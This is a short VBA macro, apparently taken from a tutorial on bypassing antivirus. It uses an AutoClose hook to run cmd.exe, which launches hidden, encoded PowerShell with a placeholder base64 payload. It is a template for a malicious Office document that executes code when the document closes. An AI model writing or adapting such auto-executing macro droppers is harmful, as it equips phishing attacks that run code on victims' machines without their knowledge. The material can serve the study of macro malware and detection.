# https://fawaz.fun/bypass-av-with-vba/

Sub MyMacro()
MsgBox "Evil stuff should happen now"
cmd = "cmd.exe /k powershell.exe -nop -enc [base64 blob of payload]"
Shell cmd
End Sub

Sub AutoClose()
MyMacro
End Sub
